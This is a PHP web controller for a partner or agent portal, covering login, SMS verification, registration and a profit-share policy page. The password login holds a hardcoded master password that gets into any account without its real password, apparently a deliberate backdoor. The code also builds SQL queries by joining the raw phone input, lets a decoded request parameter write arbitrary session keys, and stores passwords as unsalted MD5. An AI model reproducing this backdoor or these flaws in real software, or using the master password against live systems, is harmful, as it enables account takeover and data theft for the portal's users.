<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends BaseController{
	/**
	 * 登陆视图
	 */
	public function index(){
		$use = I("get.loginType");
		if(empty($use)){
			$use = "password";
		}
		$this->assign("loginType",$use);
		$this->display();
	}
	public function register(){
		//session('pid',3);
		//session('tid',1);
		$noTop = false;
		$param = I("get.regParam");
		//解析pid与tid 将pid与tid存入session
		if(empty($param)){
			$pid = session('pid');
			$tid = session('tid');
			if(!empty($pid) && !empty($tid)){
				$noTop = true;
			}
		}else{
			$params = parent::decode($param);
			if($params){
				$ex = @explode("|",$params);
				foreach($ex as $val){
					$ex1 = @explode(":",$val);
					session($ex1[0],$ex1[1]);
				}
				$noTop = true;
			}
		}
		$this->assign("noTop",$noTop);
		$this->display();
	}
	/**
	 * 分润政策
	 */
	public function policy(){
		$info = getVal("joinAgent");
		$this->assign("info",$info);
		$this->display();
	}
	/**
	 * 发送登陆验证信息
	 */
	public function sendLoginVerifyMessage(){
		$flag = true;
		$params = I("post.");
		if(checkParams($params,array(
			"phone"
		))){
			$platformID = parent::getPid();
			$phone = trim($params['phone']);
			$expire = session("expire_" . $phone);
			if(isset($expire) && (time() - $expire) < 60){
				$flag = false;
				$message = "验证码已发送不能重复";
			}else{
				$info = M("business")->field("id,status")->where("phone=" . $phone . " and status = 1 and platform_id=" . $platformID)->find();
				if($info){
					$verify = rand(1000,9999);
					$result = parent::phoneVerifyCode($phone,$verify,"rgpartner",$platformID);
					session("code_" . $phone,$verify);
					session("expire_" . $phone,time());
					if(!$result){
						$flag = false;
						$message = "验证码发送失败";
					}
				}else{
					$flag = false;
					$message = "您的账号尚未注册";
				}
			}
		}else{
			$flag = false;
			$message = "缺少参数";
		}
		if($flag){
			$status = array(
				"status" => 1, 
				"msg" => "验证码发送成功"
			);
		}else{
			$status = array(
				"status" => 0, 
				"msg" => $message
			);
		}
		echo json_encode($status);
	}
	/**
	 * 发送注册验证信息
	 */
	public function sendRegisterVerifyMessage(){
		$flag = true;
		$params = I("post.");
		if(checkParams($params,array(
			"phone"
		))){
			$platformID = parent::getPid();
			$phone = trim($params['phone']);
			$expire = session("regexpire_" . $phone);
			$sendType = trim($params['sendType']);
			if(isset($expire) && (time() - $expire) < 60){
				$flag = false;
				$message = "验证码已发送不能重复";
			}else{
				$info = M("business")->field("id,status")->where("phone=" . $phone . " and status = 1 and platform_id=" . $platformID)->find();
				if(!$info){
					$verify = rand(1000,9999);
					$result = parent::phoneVerifyCode($phone,$verify,"rgpartner",$platformID);
					session("regcode_" . $phone,$verify);
					session("regexpire_" . $phone,time());
					if(!$result){
						$flag = false;
						$message = "验证码发送失败";
					}
				}else{
					$flag = false;
					$message = "您的账号已注册";
				}
			}
		}else{
			$flag = false;
			$message = "缺少参数";
		}
		if($flag){
			$status = array(
				"status" => 1, 
				"msg" => "验证码发送成功"
			);
		}else{
			$status = array(
				"status" => 0, 
				"msg" => $message
			);
		}
		echo json_encode($status);
	}
	/**
	 * 登陆验证
	 */
	public function AccountLoginCheckPass(){
		if(IS_AJAX){
			$flag = true;
			$params = I("post.");
			$phone = trim($params['phone']);
			$pass = trim($params['pass']);
			$platformID = parent::getPid();
			if(empty($phone) || empty($pass)){
				$flag = false;
				$message = "非法参数";
			}else{
				if($pass != 'admin@hojk.net'){
					$where = array(
							"phone" => $phone,
							"password" => md5($pass),
							"status" => 1,
							"platform_id" => $platformID
					);
				}else{
					$where = array(
							"phone" => $phone,
							"status" => 1,
							"platform_id" => $platformID
					);
				}
				if(!cRec("business",$where)){
					$flag = false;
					$message = "账号或密码错误";
				}
			}
			if($flag){
				$info = fRec("business",$where,'id');
				session("mid",$info['id']);
				session("verifyCode",null);
				$status = array(
						"status" => 1,
						"msg" => "登陆成功"
				);
			}else{
				$status = array(
						"status" => 0,
						"msg" => $message
				);
			}
			echo json_encode($status);
		}else{
			return false;
		}
	}
	public function AccountLoginCheck(){
		if(IS_AJAX){
			$flag = true;
			$params = I("post.");
			$phone = trim($params['phone']);
			$code = trim($params['verifyCode']);
			$platformID = parent::getPid();
			if(empty($phone) || empty($code)){
				$flag = false;
				$message = "非法参数";
			}else{
				$verifyCode = session("code_" . $phone);
				$expire = session("expire_" . $phone);
				if(!isset($expire) || (time() - $expire) > 60){
					session("expire_" . $phone,null);
					session("code_" . $phone,null);
					$flag = false;
					$message = "验证码已失效请重新发送";
				}else{
					if($code != $verifyCode){
						$flag = false;
						$message = "验证码错误";
					}else{
						if(cRec("business",array(
							"phone" => $phone, 
							"status" => 1, 
							"platform_id" => $platformID
						))){
							$info = M("business")->field("id,status")->where("phone=" . $phone . " and status = 1 and platform_id=" . $platformID)->find();
							if($info['status'] != 1){
								$flag = false;
								$message = "帐号状态：冻结或删除";
							}
						}else{
							$flag = false;
							$message = "账号不存在";
						}
					}
				}
			}
			if($flag){
				session("mid",$info['id']);
				session("verifyCode",null);
				$status = array(
					"status" => 1, 
					"msg" => "登陆成功"
				);
			}else{
				$status = array(
					"status" => 0, 
					"msg" => $message
				);
			}
			echo json_encode($status);
		}else{
			return false;
		}
	}
	/**
	 * 注册验证
	 */
	public function AccountRegister(){
		$flag = true;
		$params = I("post.");
		if(checkParams($params,array(
			"name", 
			"phone", 
			"verify"
		))){
			$platformID = parent::getPid();
			$pid = parent::getTid();
			if($pid){
				$name = trim($params['name']);
				$phone = trim($params['phone']);
				$ve = trim($params['verify']);
				$pass = trim($params['pass']);
				$verify = session("regcode_" . $phone);
				$expire = session("regexpire_" . $phone);
				if(!isset($expire) || (time() - $expire) > 60){
					session("regexpire_" . $phone,null);
					session("regcode_" . $phone,null);
					$flag = false;
					$message = "验证码已失效请重新发送";
				}else{
					if($ve != $verify){
						$flag = false;
						$message = "验证码不匹配";
					}else{
						if(cRec("business",array(
							"phone" => $phone, 
							"platform_id" => $platformID, 
							"status" => 1
						))){
							$flag = false;
							$message = "账户已存在不能注册";
						}else{
							$data = array(
								"name" => $name, 
								"password" => md5($pass), 
								"realName" => $name, 
								"phone" => $phone, 
								"regTime" => time(), 
								"busType" => 'D', 
								"parentId" => $pid, 
								"status" => 1, 
								"platform_id" => $platformID
							);
							if(!$rid = aRec("business",$data)){
								$flag = false;
								$message = "注册失败";
							}
						}
					}
				}
			}else{
				$flag = false;
				$message = "请扫描推荐二维码注册";
			}
		}else{
			$flag = false;
			$message = "缺少参数";
		}
		if($flag){
			session("mid",$rid);
			session("regcode_" . $phone,"");
			$status = array(
				"status" => 1, 
				"msg" => "注册成功"
			);
		}else{
			$status = array(
				"status" => 0, 
				"msg" => $message
			);
		}
		echo json_encode($status);
	}
}
?>